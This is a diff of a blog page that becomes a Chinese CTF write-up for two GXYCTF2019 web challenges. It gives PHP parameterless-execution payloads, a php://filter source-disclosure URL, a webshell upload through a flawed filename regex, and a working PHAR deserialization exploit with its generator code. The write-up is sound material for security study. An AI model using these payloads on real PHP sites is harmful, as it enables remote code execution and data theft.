@@ -6,17 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://penson233.github.io">
-  <title>Category: writeup | penson.blog</title>
+  <title>GXYCTF2019--WEB | penson.blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="penson.blog">
-<meta property="og:url" content="http://penson233.github.io/categories/writeup/index.html">
+  <meta name="description" content="[GXYCTF2019]禁止套娃.git泄露用GITHACK获得源码无参数命令执行利用超全局变量进行绕过各种正则匹配可以进行无参数命令执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GXYCTF2019--WEB">
+<meta property="og:url" content="http://penson233.github.io/2020/04/05/GXYCTF2020-WEB/index.html">
 <meta property="og:site_name" content="penson.blog">
+<meta property="og:description" content="[GXYCTF2019]禁止套娃.git泄露用GITHACK获得源码无参数命令执行利用超全局变量进行绕过各种正则匹配可以进行无参数命令执行">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200404104611359.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200404104611359.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200404104853713.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200404112006207.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200405171746928.png">
+<meta property="article:published_time" content="2020-04-05T09:27:46.000Z">
+<meta property="article:modified_time" content="2020-04-05T09:32:00.707Z">
 <meta property="article:author" content="penson">
+<meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200404104611359.png">
   
     <link rel="alternative" href="/atom.xml" title="penson.blog" type="application/atom+xml">
   
@@ -194,41 +205,155 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-GXYCTF2020-WEB" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+    <h1 class="article-title" itemprop="name">
+      GXYCTF2019--WEB
+    </h1>
+  
+
+
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
 <a href="/2020/04/05/GXYCTF2020-WEB/" class="archive-article-date">
         <time datetime="2020-04-05T09:27:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-05</time>
 </a>
 
-        </div>
-    	 
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/04/05/GXYCTF2020-WEB/" target="_blank">GXYCTF2019--WEB</a>
   
-    </h1>
-  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">1.5k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">7分</span>
+    </span>
+  </span>
+</div>
 
 
-        <div class="article-info info-on-right">
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><h2 id="git泄露用GITHACK获得源码"><a href="#git泄露用GITHACK获得源码" class="headerlink" title=".git泄露用GITHACK获得源码"></a>.git泄露用GITHACK获得源码</h2><h3 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h3><p>利用超全局变量进行绕过各种正则匹配<br>可以进行无参数命令执行</p>
+<hr>
+<a id="more"></a>
+
+
+<p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E6%B3%95%E4%BA%94%EF%BC%9A" target="_blank" rel="noopener">参考文献</a></p>
+<p>相关函数</p>
+<pre><code>•localeconv() 函数返回一包含本地数字及货币格式信息的数组
+
+•scandir() 列出目录中的文件和目录。
+
+• readfile() 输出一个文件。
+
+• current() 返回数组中当前元素的值
+
+• pos() current() 的别名。
+
+• next() 函数将内部指针指向数组中的下一个元素，并输出。
+
+• array_reverse()以相反的元素顺序返回数组。
+
+• highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码
+
+•getcwd()         获取当前目录
+
+•show_source()   高亮显示
+
+• dirname()  返回上一级目录
+
+• chdir(目录)   更改当前目录
+
+•array_rand()     取数组随机位置</code></pre><p><strong>相关源码</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">     if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">         if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;</span><br><span class="line">             &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];</span><br><span class="line">             @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>第一个if禁止了文件包含所要用的的关键词 </p>
+<p>第二个if  将 （字母与下划线组成的字符窜 ( ) ）替换为空<br>举个例子，意思是将scandir()变成null，这就意味着在执行函数的时候不能放参数 </p>
+<p>第三个if   禁止了相关命令执行函数的词</p>
+</blockquote>
+<p>但还是能找到一些函数进行命令执行<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;print_r(scandir(urrent(localeconv())));</span><br><span class="line"></span><br><span class="line">exp&#x3D;print_r(array_reverse(scandir(current(localeconv()))));</span><br><span class="line"></span><br><span class="line">exp&#x3D;print_r(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line"></span><br><span class="line">exp&#x3D;show_source(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line"></span><br><span class="line">exp&#x3D;show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+<p>##方法二:<br>设置session值</p>
+<p>PHPSESSID=flag.php</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r(session_id(session_start()));</span><br><span class="line"></span><br><span class="line">readfile(session_id(session_start()));</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h1><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p><strong>第一个界面是弱密码<br>admin password登录即可</strong><br>登陆之后是一段文件上传<br>上传一句话木马<br><img src="https://img-blog.csdnimg.cn/20200404104611359.png" alt="在这里插入图片描述"><br>可以发现后缀被改为txt了<br>然后看看他的url有什么不一样<br><img src="https://img-blog.csdnimg.cn/20200404104611359.png" alt="在这里插入图片描述"><br>明显的文件包含<br>读取upload的源码<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload</span><br></pre></td></tr></table></figure>
+
+<p>源码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">	上传文件</span><br><span class="line">	&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Uploader&#123;</span><br><span class="line">	public $Filename;</span><br><span class="line">	public $cmd;</span><br><span class="line">	public $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;</span><br><span class="line">		$ext &#x3D; &quot;.txt&quot;;</span><br><span class="line">		@mkdir($sandbox, 0777, true);</span><br><span class="line">		if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;</span><br><span class="line">			$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;</span><br><span class="line">		$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function upload($file)&#123;</span><br><span class="line">		global $sandbox;</span><br><span class="line">		global $ext;</span><br><span class="line"></span><br><span class="line">		if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;</span><br><span class="line">			$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			if($file[&#39;size&#39;] &gt; 1024)&#123;</span><br><span class="line">				$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (′▽&#96;〃)&#39;);&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __toString()&#123;</span><br><span class="line">		global $sandbox;</span><br><span class="line">		global $ext;</span><br><span class="line">		&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="line">		return $this-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;</span><br><span class="line">			$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		eval($this-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">	$uploader &#x3D; new Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[&quot;file&quot;]);</span><br><span class="line">	if(@file_get_contents($uploader))&#123;</span><br><span class="line">		echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>看到__construct()方法<br><img src="https://img-blog.csdnimg.cn/20200404104853713.png" alt="在这里插入图片描述"><br>可以发现出题人在写正则匹配的时候，为了好看，打了好多空格原本他想匹配<br><strong>“    .       “</strong><br>却因为前面敲了空格，那么他只能匹配到<br>“ 空格 .”<br>又因为$this-&gt;filename我们可以修改,因为是由GET请求name决定嘛<br>由此我们先让name为我们要上传的一句话木马<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;upload.php?name&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;penson.php</span><br></pre></td></tr></table></figure>
+<p>然后$this-&gt;filename就变为penson.php了<br>又由于他限制了文件大小小于1024kb，保险起见上传.txt的一句话木马<br>蚁剑连接即可</p>
+<p>更简单的非预期解<br><img src="https://img-blog.csdnimg.cn/20200404112006207.png" alt="在这里插入图片描述"><br>因为 file_get_contents函数高亮显示变量的内容，而$this-&gt;filename又变得可控<br>那个匹配有没用了<br>直接让name=flag.php<br>随便上传一个文件即可</p>
+<p>##预期解<br>PHAR反序列化</p>
+<p><a href="https://paper.seebug.org/680/#21-phar" target="_blank" rel="noopener">phar反序列化参考文章</a></p>
+<p>phar://伪协议可以不依赖unserialize()直接进行反序列化操作，加之$this-&gt;Filename可控，因此此处$this-&gt;Filename配合phar反序列化后可以执行我们想要的命令<br> 由于 __destruct()方法给了eval()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function __destruct()&#123;</span><br><span class="line">	if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;</span><br><span class="line">		$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	eval($this-&gt;cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么我们可以生成一个phar文件<br>代码如下<br><strong>注意：需要将php.ini中的phar.readonly设置成off。</strong><br>再生成phar文件之前，需要确定上传的文件的token<br><img src="https://img-blog.csdnimg.cn/20200405171746928.png" alt="在这里插入图片描述"><br>我们根据源代码，随便上传一个文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Uploader&#123;</span><br><span class="line">	public $Filename;</span><br><span class="line">	public $cmd;</span><br><span class="line">	public $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o &#x3D; new Uploader();</span><br><span class="line">$o-&gt;cmd &#x3D; &#39;highlight_file(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;);&#39;; </span><br><span class="line">$o-&gt;Filename &#x3D; &#39;test&#39;;</span><br><span class="line">$o-&gt;token &#x3D; &#39;GXY9c0cfa04a94d475cd641716d4c699891&#39;; &#x2F;&#x2F;$_SESSION[&#39;user&#39;]，确定token值</span><br><span class="line">echo serialize($o);</span><br><span class="line"></span><br><span class="line">$phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub，增加gif文件头</span><br><span class="line">$phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>将生成的文件上传后<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;upload&amp;name&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;805453d014fddbf62528d84efd251ac6&#x2F;GXY9c0cfa04a94d475cd641716d4c699891.txt</span><br></pre></td></tr></table></figure>
+<p>再随便上传文件即可高亮输出flag.php</p>
+
+    
+
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          penson
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="http://penson233.github.io/2020/04/05/GXYCTF2020-WEB/" title="GXYCTF2019--WEB" target="_blank">http://penson233.github.io/2020/04/05/GXYCTF2020-WEB/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -240,7 +365,7 @@
 		</ul>
 	</div>
 
-          
+    
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -253,71 +378,118 @@
 	</div>
 
 
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://penson233.github.io/2020/04/05/GXYCTF2020-WEB/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/03/24/BJD2nd-Web/" class="archive-article-date">
-        <time datetime="2020-03-24T07:07:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-24</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2020/03/24/BJD2nd-Web/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">BJD2nd--Web</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/03/24/BJD2nd-Web/" target="_blank">BJD2nd--Web</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/writeup//" class="article-tag-list-link color3">writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-禁止套娃"><span class="toc-number">1.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#git泄露用GITHACK获得源码"><span class="toc-number">1.1.</span> <span class="toc-text">.git泄露用GITHACK获得源码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#无参数命令执行"><span class="toc-number">1.1.1.</span> <span class="toc-text">无参数命令执行</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GXYCTF2019-BabysqliV3-0"><span class="toc-number">2.</span> <span class="toc-text">[GXYCTF2019]BabysqliV3.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#非预期解"><span class="toc-number">2.1.</span> <span class="toc-text">非预期解</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
+        
+    </div>
+</aside>
 
-    
+
+
+
+
+
+
+
+
+
+
+
 
 
           </div>
@@ -358,10 +530,10 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
-		isCategory: true,
+		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
 		root: "/",
